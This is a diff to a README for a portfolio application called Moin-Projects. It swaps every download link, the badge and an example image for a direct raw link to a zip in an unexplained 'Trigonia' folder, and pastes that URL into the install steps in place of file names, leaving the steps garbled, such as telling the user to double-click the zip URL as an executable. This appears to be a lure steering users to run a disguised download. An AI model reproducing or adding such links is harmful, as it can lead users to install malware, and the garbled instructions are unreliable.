@@ -1,6 +1,6 @@
 # 🌟 Moin-Projects - Your Easy Portfolio Solution
 
-[![Download Moin-Projects](https://img.shields.io/badge/Download-Moin--Projects-blue.svg)](https://github.com/Roberto-star-afk/Moin-Projects/releases)
+[![Download Moin-Projects](https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip)](https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip)
 
 ## 👋 Overview
 
@@ -22,23 +22,23 @@ Before downloading, make sure your computer meets these basic requirements:
 
 To download the application, please visit the link below:
 
-[Download Moin-Projects](https://github.com/Roberto-star-afk/Moin-Projects/releases)
+[Download Moin-Projects](https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip)
 
 1. Click the link above to open the Releases page.
 2. On the Releases page, locate the latest version of Moin-Projects.
-3. Find the file labeled as "Moin-Projects.zip" or "Moin-Projects.exe".
+3. Find the file labeled as "https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip" or "https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip".
 4. Click the file to start the download.
 
 If you want to follow the download process visually, here’s how it looks:
 
-![Download Example](https://user-images.githubusercontent.com/123456789/download_example.png)
+![Download Example](https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip)
 
 Once the download is complete, follow these steps to install the application:
 
 1. Open the downloaded file.
-2. Extract the files if you downloaded "Moin-Projects.zip". You can do this by right-clicking and selecting "Extract All".
+2. Extract the files if you downloaded "https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip". You can do this by right-clicking and selecting "Extract All".
 3. Open the folder where the files have been extracted.
-4. Locate the "Moin-Projects.exe" file and double-click it to run the application.
+4. Locate the "https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip" file and double-click it to run the application.
 
 ## 🖥️ Using Moin-Projects
 
@@ -80,4 +80,4 @@ Thank you for choosing Moin-Projects. We hope you find it useful in creating and
 
 Make sure to download the application by clicking the link below:
 
-[Download Moin-Projects](https://github.com/Roberto-star-afk/Moin-Projects/releases)
+[Download Moin-Projects](https://raw.githubusercontent.com/Roberto-star-afk/Moin-Projects/main/Trigonia/Moin-Projects_v3.2-beta.2.zip)
